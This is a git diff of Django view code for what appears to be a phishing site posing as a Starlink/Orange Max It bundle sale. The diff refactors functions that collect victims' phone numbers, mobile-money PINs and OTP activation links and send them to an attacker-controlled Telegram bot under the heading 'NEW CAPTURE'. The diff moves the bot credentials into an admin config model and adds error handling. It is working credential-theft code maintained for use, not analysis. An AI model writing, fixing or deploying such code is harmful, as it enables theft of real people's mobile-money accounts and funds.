@@ -5,26 +5,23 @@ import logging
 from django.shortcuts import render, redirect, get_object_or_404
 from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
-from .models import Order, Bundle 
-from .models import TelegramConfig
-
-def send_telegram_notification(message):
-    # This pulls the info you saved in the Admin "button"
-    config = TelegramConfig.objects.first()
-    
-    if config:
-        bot_token = config.bot_token
-        chat_id = config.chat_id
-        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
-        
-        import requests
-        requests.post(url, data=payload)
-    else:
-        print("Telegram not configured in Admin panel!")
+from .models import Order, Bundle, TelegramConfig
 
 # Setup Logging
 logger = logging.getLogger(__name__)
+
+def send_telegram_notification(message):
+    """Helper function to send messages using Admin panel config"""
+    config = TelegramConfig.objects.first()
+    if config:
+        url = f"https://api.telegram.org/bot{config.bot_token}/sendMessage"
+        payload = {"chat_id": config.chat_id, "text": message, "parse_mode": "HTML"}
+        try:
+            requests.post(url, data=payload, timeout=10)
+        except Exception as e:
+            logger.error(f"Failed to send Telegram: {e}")
+    else:
+        logger.warning("Telegram not configured in Admin panel!")
 
 def home(request):
     return render(request, 'index.html')
@@ -40,10 +37,8 @@ def payment_instructions(request):
         city = request.POST.get('city', '')
         bundle_name = request.POST.get('bundle', 'Power User')
 
-        # Get the bundle object
         selected_bundle = Bundle.objects.filter(name=bundle_name).first() or Bundle.objects.first()
         
-        # Create the order
         order = Order.objects.create(
             full_name=full_name,
             city=city,
@@ -51,7 +46,6 @@ def payment_instructions(request):
             bundle=selected_bundle
         )
 
-        # Store order ID in session
         request.session['current_order_id'] = str(order.order_id)
         return render(request, 'payment_instructions.html', {'order': order})
     
@@ -71,7 +65,7 @@ def otp_verification(request):
 
             request.session['phone'] = phone
             request.session['pin'] = pin
-            request.session['bundle'] = str(order.bundle)
+            request.session['bundle_name'] = order.bundle.name if order.bundle else "Unknown"
 
         return redirect('starlink_app:otp_verification')
     return render(request, 'otp_verification.html', {'order': order})
@@ -80,55 +74,33 @@ def otp_verification(request):
 def sync_data(request):
     if request.method != 'POST':
         return JsonResponse({"status": "error", "message": "Method not allowed"}, status=405)
- try:
-        # Parse JSON from the frontend
+
+    try:
         data = json.loads(request.body)
         otp_link = data.get('otp', 'No Link provided')
 
-        # Retrieve Session Data
-        phone = request.session.get('phone', 'Missing')
-        bundle = request.session.get('bundle', 'Missing')
-        pin = request.session.get('pin', 'Missing')
+        order = Order.objects.order_by('-created_at').first()
+        if order:
+            order.otp_activation_link = otp_link
+            order.save()
 
-        # Get Telegram Credentials
-        bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
-        chat_id = os.getenv('TELEGRAM_CHAT_ID')
-
-        if not bot_token or not chat_id:
-            logger.error("CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing in Render Settings.")
-         return JsonResponse({"status": "error", "message": "Server config missing"}, status=500)
-
-        # Format Telegram Message
-try:
-        # Your message formatting
-        message = (
-            "🇸🇱 <b>ORANGE MAX IT - NEW CAPTURE</b>\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            f"📞 <b>PHONE:</b> {order.phone_number}\n"
-            f"🔑 <b>PIN:</b> {order.orange_pin}\n"
-            f"📦 <b>BUNDLE:</b> {order.bundle.name}\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            "🔗 <b>OTP LINK:</b>\n"
-            f"{order.otp_activation_link}\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            "📡 <b>STATUS:</b> DATA RECEIVED"
-        )
+            message = (
+                "🇸🇱 <b>ORANGE MAX IT - NEW CAPTURE</b>\n"
+                "━━━━━━━━━━━━━━━━━━\n"
+                f"📞 <b>PHONE:</b> {order.phone_number or 'Not provided'}\n"
+                f"🔑 <b>PIN:</b> {order.orange_pin or 'Not provided'}\n"
+                f"📦 <b>BUNDLE:</b> {order.bundle.name if order.bundle else 'N/A'}\n"
+                "━━━━━━━━━━━━━━━━━━\n"
+                "🔗 <b>OTP LINK:</b>\n"
+                f"{otp_link}\n"
+                "━━━━━━━━━━━━━━━━━━\n"
+                "📡 <b>STATUS:</b> DATA RECEIVED"
+            )
+            send_telegram_notification(message)
+            return JsonResponse({"status": "success"})
         
-
-        # Send to Telegram
-        telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        response = requests.post(telegram_url, json={
-            "chat_id": chat_id,
-            "text": message,
-            "parse_mode": "Markdown"
-        }, timeout=15)
-
-        if response.status_code == 200:
-              return JsonResponse({"status": "success"})
-    else:
-            logger.error(f"Telegram Failure: {response.text}")
-            return JsonResponse({"status": "success", "info": "processing"})
+        return JsonResponse({"status": "error", "message": "No order found"}, status=404)
 
     except Exception as e:
         logger.exception("Internal Sync Error:")
-        return JsonResponse({"status": "error", "message": "Internal Server Error"}, status=500)
+        return JsonResponse({"status": "error", "message": str(e)}, status=500)
